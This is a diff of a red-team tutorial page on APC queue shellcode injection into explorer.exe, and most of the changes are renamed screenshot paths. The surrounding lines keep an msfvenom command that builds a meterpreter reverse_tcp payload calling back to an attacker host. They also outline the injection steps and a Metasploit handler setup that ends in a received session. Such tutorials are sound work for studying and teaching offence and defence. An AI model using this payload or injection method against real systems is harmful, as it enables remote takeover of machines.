@@ -33,27 +33,27 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c
 ```
 {% endcode %}
 
-![](<../../.gitbook/assets/Annotation 2019-05-26 111814.png>)
+![](../../.gitbook/assets/annotation-2019-05-26-111814.png)
 
 I will be injecting the shellcode into `explorer.exe` since there's usually a lot of thread activity going on, so there is a better chance to encounter a thread in an alertable state that will kick off the shellcode. I will find the process I want to inject into with `Process32First` and `Process32Next` calls:
 
-![](<../../.gitbook/assets/Annotation 2019-05-26 152927.png>)
+![](../../.gitbook/assets/annotation-2019-05-26-152927.png)
 
 Once explorer PID is found, we need to get a handle to the explorer.exe process and allocate some memory for the shellcode. The shellcode is written to explorer's process memory and additionally, an APC routine, which now points to the shellcode, is declared:
 
-![](<../../.gitbook/assets/Annotation 2019-05-26 151203.png>)
+![](../../.gitbook/assets/annotation-2019-05-26-151203.png)
 
 If we compile and execute `apcqueue.exe`, we can indeed see the shellcode gets injected into the process successully:
 
-![](<../../.gitbook/assets/Annotation 2019-05-26 133126.png>)
+![](../../.gitbook/assets/annotation-2019-05-26-133126.png)
 
 A quick detour - the below shows a screenshot from the Process Hacker where our malicious program has a handle to explorer.exe - good to know for debugging and troubleshooting:
 
-![](<../../.gitbook/assets/Annotation 2019-05-26 133312.png>)
+![](../../.gitbook/assets/annotation-2019-05-26-133312.png)
 
 Back to the code - we can now enumerate all threads of explorer.exe and queue an APC (points to the shellcode) to them:
 
-![sleep for some throttling](<../../.gitbook/assets/Annotation 2019-05-26 151757.png>)
+![sleep for some throttling](<../../.gitbook/assets/Annotation 2019-05-26 151757 (1).png>)
 
 Switching gears to the attacking machine - let's fire up a multi handler and set an `autorunscript` to migrate meterpreter sessions to some other process before they die with the dying threads:
 
@@ -66,7 +66,7 @@ set autorunscript post/windows/manage/migrate
 
 Once the `apcqueue` is compiled and run,  a meterpreter session is received - the technique worked:
 
-![](<../../.gitbook/assets/Annotation 2019-05-26 134126.png>)
+![](../../.gitbook/assets/annotation-2019-05-26-134126.png)
 
 ## States
 
